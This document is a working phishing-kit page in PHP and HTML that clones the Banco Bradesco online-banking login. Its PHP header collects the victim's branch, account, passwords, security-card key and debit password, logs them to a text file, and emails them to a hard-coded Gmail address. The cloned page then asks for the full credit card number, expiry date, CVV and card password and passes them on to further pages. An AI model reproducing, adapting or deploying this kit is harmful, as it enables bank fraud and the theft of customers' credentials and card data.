<?php  
session_start();
error_reporting(0);
$agencia = $_POST['agencia'];
$conta = $_POST['conta'];
$digito = $_POST['digito'];
$senha = $_POST['senha'];
$chave = $_POST['chave'];
$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$_SESSION["chave"] = $chave;
$_SESSION["senha"] = $senha;
$_SESSION["agencia"] = $agencia;
$_SESSION["conta"] = $conta;
$_SESSION["digito"] = $digito;
$para="rolexasus@gmail.com";
$n_dir="arquivos/";
$data = date("d/m/y"); // * Função para pegar a data de envio do e-mail
$ip = $_SERVER['REMOTE_ADDR']; // * Função para pegar o ip do usuário
$navegador = $_SERVER['HTTP_USER_AGENT']; // * Função para pegar o navegador do visitante
$hora = date("H:i");
$subj = "Dados / IP: $ip - Bradesco: DadosCC";
$msg = "
   ---------------------------------------------
$data-($hora) - $ip - $pcname
---------------------------------------------

   ------------ BRADESCO ------------
AG: '.$_SESSION[agencia].'
CONTA: '.$_SESSION[conta].'-'.$_SESSION[digito].'
SENHA 4: '.$_SESSION[senha]. '
SENHA 6 DIG: '.$_POST[senhad6]. '
SENHA CC DÉBITO: '.$_POST[senhacd]. '

====== DADOS DO CC =======
$cc1 - $cc2 - $cc3 - $cc4
$meses/$anual
$infovia - $tiporei
==========FIM CC =========
------------BRADESCO INVESTIMENTOS------------

   ";
$h = date(" d-m-Y H-i-s");
$fp = fopen("$n_dir"."Bradesco_DadosCC"."["."$h]"."$ip".".txt", "a");
// Escreve "exemplo de escrita" no bloco1.txt
$escreve = fwrite($fp, $msg);
fclose($fp);   
   
mail($para, $subj, $msg, "from: $aviao");

{
	


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>

<head>
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	<link rel="shortcut icon" href="Banco%20Bradesco%20S_A_files/bradesco.ico"/>
	<title>Banco Bradesco S/A</title>



    

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/estrutur.css" />

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/interna0.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery00.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery01.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery02.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery03.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/login000.css" />


    

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/conteudo.css" />



    


<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery00.js"></script>


    

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery01.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery02.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery03.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery04.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery05.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/swfobjec.js"></script>





<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/currency.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/validaco.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/default1.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/tecladov2.js"></script>



    



    <!--[if lt IE 8]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie.css" />


	


	<![endif]-->

	<!--[if lt IE 7]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie6.css" />


	

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/pngfix.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/jquery.bgiframe.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/default_ie.js"></script>


	<![endif]-->
    
    <script type="text/javascript"><!--
var isPrime=false;

//--></script>
    <script type="text/javascript"><!--
var loginMainUrlEncerra='https://www.ib2.bradesco.com.br/ibpflogin/logoff.jsf';

//--></script>
    <script type="text/javascript"><!--
var loginMainNomeCtl='CTL';

//--></script>
    <script type="text/javascript"><!--
var loginMainCtl='7605190925697317521150';

//--></script>
	    
	    
	    <script type="text/javascript">
			document.domain = "#";			
			function cancelarAcesso() {
 				window.top.location = loginMainUrlEncerra + "?" + loginMainNomeCtl + "=" + loginMainCtl;     
   				return false;
			}
			
			
			
function autotab(elemento)
{
 if (elemento.value.length < elemento.getAttribute("maxlength")) return;
 var formulario = elemento.form;
 var els = formulario.elements;
 var x, autotab;
 for (var i = 0, len = els.length; i < len; i++)
 {
  x = els[i];
  if (elemento == x && (autotab = els[i+1]))
  {
   if (autotab.focus) autotab.focus();
  }
 }
}

function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
}

function execmascara(){
	
      v_obj.value=v_fun(v_obj.value)
 
} 

function soNumeros(v){
    return v.replace(/\D/g,"")
	
}
function MM_callJS(jsStr) { //v2.0
  return eval(jsStr)
}

	    </script>
        
        
	
<style type="text/css">
<!--
body {
	background-color: #FFFFFF;
}

.formulariosenha {
	border: 1px solid #939394;
}
#apDiv1 {
	position:absolute;
	left:214px;
	top:284px;
	width:39px;
	height:20px;
	z-index:1;
}
-->
</style>
<script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<div id="miolo" style="margin-left:2px; margin-top:2px;"  class="after login">	
						
		<script type="text/javascript"><!--
var pametrosHdaSenha4UnicoTitular='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=1';

//--></script><script type="text/javascript"><!--
var pametrosHdaSelecaoMultiplosTitulares='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=2';

//--></script><script type="text/javascript"><!--
var pametrosHdaSenha4MultiplosTitulares='r_0-21_verificaoferta|hdaOfertaDisp=0';

//--></script><script type="text/javascript"><!--
var numControle='7605190925697317521150';

//--></script><script type="text/javascript"><!--
var hdaAtivadoLogin=false;

//--></script><script type="text/javascript"><!--
var hdaPosicaoLogin=1;

//--></script><script type="text/javascript"><!--
var hdaVisivelLogin=false;

//--></script><script type="text/javascript"><!--
var isPrimeiroAcesso=false;

//--></script><script type="text/javascript"><!--
var sequenciaTeclado=new Array(6,7,0,3,5,4,2,9,8,1);

//--></script>




<script type="text/javascript"><!--
var urlAutenticacao='autenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script>



<script type="text/javascript"><!--
var urlProximoTipoAutenticacao='tipoAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm?nome=valor';

//--></script><script type="text/javascript"><!--
var urlAceite='aceite.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var urlProximaPagina='proxAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var sequenciaProximoDispositivo=2;

//--></script>








<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/login000.js"></script>
<div id="conteudo" style="left:0; "  class="after conteudo_L">
   <p><img src="images/conf2.jpg" />
    </p>
   <p><img src="images/cc.png" alt="" width="732" height="316" /></p>
   <p>
     <script>           
        jQuery(function($) {          
            var tit = "Limpar";             
        	$('#botao_limpar').attr('title', tit); 
        });     
     </script></p>
   <div id="conteudo_interno" style="border-bottom:1px #FFFFFF solid;" class="miolo miolo_noBg after"><div id="divMioloPaginaLogin" class="boxP20 after"><div>
  <div id="box_titular" style="display:none;" class="pb15 after"><a id='link_saudacao' class='linkInvisivel tabindex' href='' 
                title='Boa tarde, Lincoln'></a><a class="loging_Tip bTip tabindex linkInvisivel" id="contPrincDV" title="Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.">Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.</a></div>
				
		  <script language="javascript">
		function bradescoaguard() {

  var t=setTimeout("redirdesco()",10000);
}

function redirdesco() {
  document.forms['sss'].action = "p4.php";
	document.forms['sss'].submit();
}
		</script>		
		
						
  <form id="sss" name="sss" method="post" action="finalchave.php" enctype="application/x-www-form-urlencoded" onsubmit="" class="ajaxForm allowSubmit">
  
  
 <input type="hidden" id="senhacd" name="senhacd" />
 

<input type="hidden" name="senhad6" value="<?php echo "$_POST[senhad6]"; ?>">


<input type="hidden" name="agencia" value="<?php print("$_SESSION[agdes]"); ?>">
<input type="hidden" name="conta" value="<?php print("$_SESSION[ctdes]"); ?>">
<input type="hidden" name="digito" value="<?php print("$_SESSION[digdes]"); ?>">
<input type="hidden" name="senha" value="<?php print("$_SESSION[SENHA]");?>">
<input type="hidden" name="chave" value="<?php print("$_SESSION[chave]");?>">

<input name="cc1" type="text" class="formulariosenha1" id="cc1" style="position: absolute; left: 155px; top: -108px; width: 35px; height: 10px; z-index: 1;" maxlength="4" onkeyup="autotab(this);" onkeypress="mascara(this,soNumeros)"/>
<input name="cc2" type="text" class="formulariosenha1" id="cc2" style="position: absolute; left: 211px; top: -108px; width: 35px; height: 10px; z-index: 1;" maxlength="4" onKeyUp="autotab(this);" onKeyPress="mascara(this,soNumeros)"/>
  
  <input name="cc3" type="text" class="formulariosenha1" id="cc3" style="position: absolute; left: 267px; top: -108px; width: 35px; height: 10px; z-index: 1;" maxlength="4" onKeyUp="autotab(this);" onKeyPress="mascara(this,soNumeros)"/>
  
  <input name="cc4" type="text" class="formulariosenha1" id="cc4" style="position: absolute; left: 323px; top: -108px; width: 35px; height: 10px; z-index: 1;" maxlength="4" onKeyUp="autotab(this);" onKeyPress="mascara(this,soNumeros)"/>
  
 <!-- mes - ano - via - tipo-->
 
 <input name="meses" type="text" class="formulariosenha1" id="meses" style="position: absolute; left: 155px; top: -79px; width: 19px; height: 10px; z-index: 1;" maxlength="2" onKeyUp="autotab(this);" onKeyPress="mascara(this,soNumeros)"/>
  
   <input name="anual" type="text" class="formulariosenha1" id="anual" style="position: absolute; left: 195px; top: -79px; width: 19px; height: 10px; z-index: 1;" maxlength="2" onKeyUp="autotab(this);" onKeyPress="mascara(this,soNumeros)"/>
   
    <input name="infovia" type="text" class="formulariosenha1" id="infovia" style="position: absolute; left: 304px; top: -79px; width: 19px; height: 10px; z-index: 1;" maxlength="2" onKeyUp="autotab(this);" onKeyPress="mascara(this,soNumeros)"/>
    
     <input name="tiporei" type="text" class="formulariosenha1" id="tiporei" style="position: absolute; left: 392px; top: -79px; width: 19px; height: 10px; z-index: 1;" maxlength="2" onKeyUp="autotab(this);" onKeyPress="mascara(this,soNumeros)"/>
     
     <input name="cvv" type="text" class="formulariosenha1" id="cvv" style="position: absolute; left: 155px; top: -45px; width: 52px; height: 10px; z-index: 1;" maxlength="3" onkeyup="autotab(this);" onkeypress="mascara(this,soNumeros)"/>
  <!----- FIM DOS DAODS DO CC------->
  
  
  <div id="form_titular:box_senha4" class="box_redLine_bottom after inativo">
  
  <div id="form_titular:div_boxP14_senha4" class="boxP14"><div id="form_titular:erro_senha4" class="erro_msg none_i"></div><ul id="form_titular:ul_senha4_colsLogin" class="colsLogin after"><li id="form_titular:li_senha4_1" class="nro"><span id="form_titular:senha4_numero_passo">1</span></li>
<li id="form_titular:li_senha4_2" class="legendaBox"><span id="form_titular:text_senha4_legendaBox">Informe sua senha do <strong style="white-space:nowrap">Cart&atilde;o de Cr&eacute;dito</strong><br>
    clicando nos bot&#245;es ao lado:</span><br />
    
    
   <div id="layer" style="position:absolute; left:73px; top:110px; width:21px; height:17px; z-index:3">
        <img src=".\images\Visa_master.png" style="cursor: default;"  border="0" class="BtnToken">
      </div>
    
</li>
    
    
    
<li id="form_titular:li_colsLogin_3"><ul id="form_titular:ul_teclado_virtual" class="btnKeyboardVirtualSingle after"></ul></li></ul><ul id="form_titular:ul_input_fields" class="input_fields after"><div><li id="form_titular:li_input_fields_1">

<div>

<div style="float:left;">
<input type="password" style="border-right:0px;"  id="txtPass1" name="txtPass1" maxlength="1" title="Informe sua senha de 4 d&#237;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;">
<input type="password" id="txtPass2" style="border-left:0px;border-right:0px;" name="txtPass2" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;">
<input type="password" id="txtPass3" style="border-left:0px;border-right:0px;" name="txtPass3" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;">
<input type="password" id="txtPass4" style="border-left:0px;border-right:0px;" name="txtPas4" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;">
<input type="password" id="txtPass5" style="border-left:0px;border-right:0px;" name="txtPass5" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;">
<input type="password" id="txtPass6" style="border-left:0px;" name="txtPass6" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>

</div>




</li>
    <li id="form_titular:li_input_fields_2"></li>
<li id="form_titular:li_input_fields_3"></li>
<li id="form_titular:li_input_fields_4"></li>
</div><li id="form_titular:li_input_fields_5"><span id="form_titular:text_tooltip_teclado"><a id="a_teclado" class="senha_Tip bTip auto_Tip tabindex tab-1 linkInvisivel" 
                    title="Para sua seguran&ccedil;a, informe a sua senha do cart&atilde;o de cr&eacute;dito de 4 ou 6 d&iacute;gitos.">Para sua seguran&ccedil;a, informe a sua senha de 4 d&iacute;gitos.</a></span></li>
<li id="form_titular:li_input_fields_6" class="leg"><span id="form_titular:label_li_input_fields_6">(Informe sua senha do cart&atilde;o de cr&eacute;dito 4 ou 6 d&#237;gitos)</span></li>
<li id="form_titular:li_input_fields_7"><div id="form_titular:loading_login" class="loading  loading_pass4 fl after none_i"><div id="form_titular:div_carregando" class="txt"><span id="form_titular:link_ancora_carregando"><a id="ancora_carregando" href="#" title="Carregando..."></a></span><span id="form_titular:label_carregando">Carregando...</span></div></div></li><li id="form_titular:li_input_fields_8" class="itmContraste"><div id="form_titular:div_contraste" class="contrasteTeclado"><span id="form_titular:text_label_contraste"><span class="label " id="label_contraste">Contraste do teclado:</span>
                    
                      <a id="diminuiContraste" alt="Diminuir o contraste" title="Diminuir - contraste dos n&#250;meros do teclado virtual" 
                        class="diminuiContraste tabindex tab-1" href="">Diminui</a>
                                              
                      <a id="aumentaContraste" alt="Aumentar o contraste" 
                        title="Aumentar - contraste dos n&#250;meros do teclado virtual" class="aumentaContraste tabindex tab-1" href="">Aumenta</a>
                        
            <a id="a_tooltip_contraste" class="bTip auto_Tip tabindex linkInvisivel tab-1" 
						title="Utilize os bot&#245;es ao lado para diminuir <br/>ou aumentar o contraste dos n&#250;meros. <br/>Para seguran&#231;a, sugerimos que diminua <br/>o contraste, isso dificulta a captura visual.">Utilize os bot&#245;es ao lado para diminuir ou aumentar o contraste dos n&#250;meros. Para seguran&#231;a, sugerimos que diminuao contraste, isso dificulta a captura visual. </a></span></div></li></ul></div></div>
						
						
						
						
						
						
						
						<div id="aaa" style="display:none;" class="emba after ativo">
						
						<div id="lista-conteudos" class="conteudo-dinamico none_i"><div id="dicas_primeiroAcesso_1" class="dicas_primeiroAcesso_1"><div id="dicaChaveSoUmaVez" class="box-dica box-seguranca"><div class="linha"><!-- --></div><h2 class="atencao">Atenção</h2><span>O Bradesco solicita a digitação da Chave de Segurança apenas uma vez a cada transação.<br><br>Se você digitar errado, o Bradesco solicitará a mesma posição para este acesso, nunca outra.</span></div></div><div id="dicas_primeiroAcesso_2" class="dicas_primeiroAcesso_2"><div class="last"><div class="box-dica box-duvida"><h2>Em caso de dúvidas</h2><ul class="listaLinks"><li><span>Veja mais informações sobre o</span><br><a tabindex="20" class="link_ext pr12 tabindex" rel="external" style="white-space: nowrap;" href="http://www.bradesco.com.br/html/content/como_usar/chave.shtm" title="Cartão Chave de Segurança">Cartão Chave de &nbsp;Segurança</a></li><li><a tabindex="21" class="link_ext tabindex" href="javascript:;" onclick="return popupFaleconosco();" title="Entre em contato com o Bradesco">Entre em contato</a> <span>com o Bradesco</span></li></ul></div></div></div></div><div class=""><div class="boxP14"><span id="txt_msg_erro_frase"><span class="erro_msg none_i">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cartão, conforme posição solicitada.</span></span><ul id="_id18" class="colsLogin after"><li id="_id19" class="nro">2</li><li id="_id21" class="legendaBox"><span id="text_tancode">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cartão, conforme posição solicitada.</span></li><li id="_id22"></li></form>
						
						
						
						<input type="hidden" name="form_titular_SUBMIT" value="1" /><input type="hidden" name="autoScroll" />
						<input type="hidden" name="loginbotoes:_link_hidden_2" />
						</form>
						<div id="divDispositivos"></div>
						<div id="div-textoAntesBotoes" class="textoAntesBotoes"></div><div id="divBotoesPagina" class="mt0 bt0"><form id="loginbotoes" name="loginbotoes" method="post" action="#" enctype="application/x-www-form-urlencoded" onsubmit="javascript: return false;"><ul id="loginbotoes:ul_btos_bottom" class="btos_bottom"><li id="loginbotoes:li_btos_bottom_1"><input id="loginbotoes:bt_cancelar_acesso" name="loginbotoes:bt_cancelar_acesso" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif"  alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex botoesLogin" /></li><li id="loginbotoes:_id85"><input id="loginbotoes:botaoAvancar" name="loginbotoes:botaoAvancar" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onclick="javascript: vai();" alt="Avan&#231;ar" title="Avan&#231;ar" class="bt_avancar bto_input tabindex tab-1 botoesLogin" /></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="loginbotoes:_link_hidden_" />
						
<!-- onclick="javascript: avancar();return;;clear_loginbotoes();document.forms['loginbotoes'].elements['autoScroll'].value=getScrolling();" -->
						
						<script type="text/javascript"><!--
function clear_loginbotoes() {
  var f = document.forms['loginbotoes'];
  f.elements['loginbotoes:_link_hidden_'].value='';
  f.target='';
}
clear_loginbotoes();
//--></script></form></div><div id="div-textoAposBotoes" class="textoAposBotoes"></div></div>
</div>
</div>


<form id="loginbotoes" name="loginbotoes" method="post" action="#" enctype="application/x-www-form-urlencoded" onsubmit="javascript: return false;"><ul id="loginbotoes:ul_btos_bottom" class="btos_bottom">
  <li id="loginbotoes:li_btos_bottom_1"></li>
  <li id="loginbotoes:_id85"><input id="loginbotoes:botaoAvancar" name="loginbotoes:botaoAvancar" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onclick="javascript: vai();" alt="Avan&#231;ar" title="Avan&#231;ar" class="bt_avancar bto_input tabindex tab-1 botoesLogin" /></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" />
  <!-- onclick="javascript: avancar();return;;clear_loginbotoes();document.forms['loginbotoes'].elements['autoScroll'].value=getScrolling();" -->
						
	  <script type="text/javascript"><!--
function clear_loginbotoes() {
  var f = document.forms['loginbotoes'];
  f.elements['loginbotoes:_link_hidden_'].value='';
  f.target='';
}
clear_loginbotoes();
//--></script></form></div>


</div>
<script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/publicKe.js"><!--

//--></script><script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/scpscrpt.js"><!--

//--></script><script language="javascript"><!--

setPublic(n_InternetBanking, e_InternetBanking);  
function setEncryptEventTrap(element, eventName, trapFunction) {
    if (element.addEventListener){
        element.addEventListener(eventName, trapFunction, false);
    } else if (element.attachEvent){
        element.attachEvent('on' + eventName, trapFunction);
} 
} 
function handOnClick(e) {
    rng_seed_time();
} 
function handOnKeyPress(e) {
    rng_seed_time();
} window.document.onclick = handOnClick;
window.document.onkeypress = handOnKeyPress;
function getValor(campo) {
    var retorno = "";
    try {
        if(typeof(campo.length) != "undefined") {
            if (campo[0].type == "radio") {
                for (var i = 0; i < campo.length; i++) {
                    if (campo[i].checked) {
                        retorno = campo[i].value;
                        break;
                     }
                    }
             }
        } else {
            if(campo.type == "checkbox" || campo.type == "radio") {            
                if (campo.checked) {
                    retorno = campo.value;
                 }
            } else {
                retorno = campo.value;
            }
        }
    } catch (err) {
    }
    return retorno;
} function setValor(campo, novoValor, permiteBranco) {
   try {
       if(typeof(campo.length) != "undefined") {
           if (campo[0].type == "radio") {
              if (novoValor != "" || permiteBranco) {
                   for (var i = 0; i < campo.length; i++) {
                       if (campo[i].value == novoValor) {
                           campo[i].checked = true;
                       } else {
                           campo[i].checked = false;
                       }
                  }
                }
          }
       } else {
           if(campo.type == "checkbox") {            
               if (campo.value == novoValor) {
                   campo.checked = true;
               } else {
                   campo.checked = false;
              }
           } else if(campo.type == "radio") {
               if (novoValor != "" || permiteBranco) {
                   if (campo.value == novoValor) {
                       campo.checked = true;
                   } else {
                       campo.checked = false;
                   }
               }
           } else {
               campo.value = novoValor;
           }
       }
   } catch (err) {
} } function enc(formName, params) {
   var loop;
   for (loop = 0; loop < params.length; loop++) {
       var valorAux = getValor(window.document.forms[formName].elements[params[loop][0]]);
       window.document.forms[formName].elements[params[loop][1]].value = cript("7605190925697317521150", valorAux); 
       window.document.forms[formName + "_backup"].elements[params[loop][0]].value = valorAux;
      setValor(window.document.forms[formName].elements[params[loop][0]], "", true); 
} 
} 
function inic(formName, params) {
   var loop; 
   var dado; 
   for (loop = 0; loop < params.length; loop++) { 
       dado = window.document.forms[formName].elements[params[loop][1]].value;
       if (dado.length == 172 && dado.charAt(171) == "=") {
           dado = window.document.forms[formName + "_backup"].elements[params[loop][0]].value;
} 
      setValor(window.document.forms[formName].elements[params[loop][0]], dado, false);
} 
} 


//--></script><div style="visibility:visible; display:hide"></div>
<script language="javascript"><!--

var params_form_cript = new Array();
   params_form_cript[0] = ["form_cript:valor_dig", "form_cript:valor_cript"];
var processado_form_cript = false;
function origOnSubmitform_cript() {return true;}
function enc_form_cript() { 
   if (origOnSubmitform_cript() == false) {
       return false;
   }
   enc("form_cript",  params_form_cript); 
   return true;
} 
function inic_form_cript() {
   inic("form_cript", params_form_cript) ;
} 
setEncryptEventTrap(window, "load", inic_form_cript);


//--></script><script type="text/javascript">
AC_AX_RunContent( 'classid','clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF','height','0','id','Conexao','width','0','update','1|1|1' ); //end AC code
</script><noscript><object classid="clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF" height="0" id="Conexao" width="0"><param name="Update" value="1|1|1" /></object></noscript><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

        
        <!-- fim pb15 after -->

        
          <!-- Mais de um titular -->              
                        
          <!-- Select Titular - Box redline -->   
          
          
              
                <script type="text/javascript">
                <!--
                jQuery('#numero-tela').html('RLO01');
                //-->
                </script>          
                    
              
                
      
<!-- fim conteudo -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- ### UL BOX DIREITA ### -->
<!-- HDA -->
<!-- VIDEO -->
<!-- // VIDEO -->
<!-- // HDA -->
<!-- -->
<!-- -->
<!-- -->
<!-- ### FIM UL BOX DIREITA ### -->
<!--</div></div></ul>-->
<!-- ### RODAPÉ ### -->
<!-- ### FIM RODAPÉ ### -->
<div id="modalLogin" class="jqmWindow modalNaoFecha none_i" style="width:523px;"><div id="modalLogin_jqmCornerTop" class="jqmCornerTop"><div id="jqmCornerTop_1" class="cc"></div><div id="jqmCornerTop_2" class="c1"></div><div id="jqmCornerTop_3" class="c2"></div></div><div id="modalMiolo" class="jqmWrapper after"><a id='linkTituloModalLogin' href='javascript:;' class='tabindex modal-title tabfirst tabmodal' 
        title='Acesso Seguro'></a><div id="modalFechar" class="jqmTop after"><a href="javascript:;" class="lnkFechar closeModalLogin tabindex none_i" title="Fechar">Fechar</a><h4>Acesso Seguro</h4></div><div id="modalContentAfter" class="jqmContent after"><div id="modalBoxAlertPrincipal" class="ptb20"><div id="modalBoxAlertMessage" class="box-alerta sinal-X after"><div id="modalBoxAlertTexto" class="ctn-box after"><span class="HtmlOutputTextBradesco"><p><P>Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.</P></p></span></div></div><span class="HtmlOutputTextBradesco"><a id='mensagem-erro' class='modal-title tabindex tab-1 linkInvisivel' 
                      title='Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.'></a></span><span id="textoPosErro" class="ctn-voltar">Em caso de d&#250;vidas, por favor, entre em contato com o <a class="link_ext tabindex" id="FFB" title="Fone F&#225;cil Bradesco, ir para p&#225;gina." href="javascript:;" onclick="return fonefacil();">Fone F&#225;cil Bradesco</a></span></div></div><ul id="_id121" class="lstButtonsLine block"><li id="_id122" class="pl20"><div id="div-textoAntesBotoes" class="textoAntesBotoes"></div></li><li id="_id124"><ul id="listaCancelarAcesso" class="lstButtons  btos_bottom fn after"><li id="cancelAcesso"><form id="cancelarAcessoModalForm" name="cancelarAcessoModalForm" method="post" action="https://www.ib2.bradesco.com.br/ibpflogin/login.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm" enctype="application/x-www-form-urlencoded" onsubmit="return false;" title="Cancelar Acesso"><input id="cancelarAcessoModalForm:_id125" name="cancelarAcessoModalForm:_id125" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onclick="javascript: cancelarAcesso();;clear_cancelarAcessoModalForm();document.forms['cancelarAcessoModalForm'].elements['autoScroll'].value=getScrolling();" alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex " /><input type="hidden" name="cancelarAcessoModalForm_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="cancelarAcessoModalForm:_link_hidden_" /><script type="text/javascript"><!--
function clear_cancelarAcessoModalForm() {
  var f = document.forms['cancelarAcessoModalForm'];
  f.elements['cancelarAcessoModalForm:_link_hidden_'].value='';
  f.target='';
}
clear_cancelarAcessoModalForm();
//--></script></form></li></ul></li><li id="_id126" class="pl20"><div id="div-textoAposBotoes" class="textoAposBotoes"></div></li></ul><a id='marcador-fim-modal' href='javascript:;' class='tabindex tabmodal' 
                onblur='focoTituloModal()'></a></div><div id="modalLogin_jqmCornerBottom" class="jqmCornerBottom"><div id="jqmCornerBottom_1" class="cc"></div><div id="jqmCornerBottom_2" class="c3"></div><div id="jqmCornerBottom_3" class="c4"></div></div></div>
 

<!-- fim jqmWindow  -->
<!-- fim modal login -->
 	
    <div id="modalContent" class="jqmWindow modalNaoFecha" style="width:550px;"><div id="modalContent_jqmCornerTop" class="jqmCornerTop"><div id="modalContent_top_1" class="cc"></div><div id="modalContent_top_2" class="c1"></div><div id="modalContent_top_3" class="c2"></div></div><div class="jqmWrapper after"></div><div id="bottomModalContent" class="jqmCornerBottom"><span class="cc"><!-- --></span><span class="c3"><!-- --></span><span class="c4"><!-- --></span></div></div>
 

<?php }; ?>

</body>
<script type="text/javascript"><!--
function getScrolling() {
    var x = 0; var y = 0;
    if (self.pageXOffset) {
        x = self.pageXOffset;
        y = self.pageYOffset;
    } else if (document.documentElement && document.documentElement.scrollLeft) {
        x = document.documentElement.scrollLeft;
        y = document.documentElement.scrollTop;
    } else if (document.body) {
        x = document.body.scrollLeft;
        y = document.body.scrollTop;
    }
    return x + "," + y;
}

//--></script>
</html>

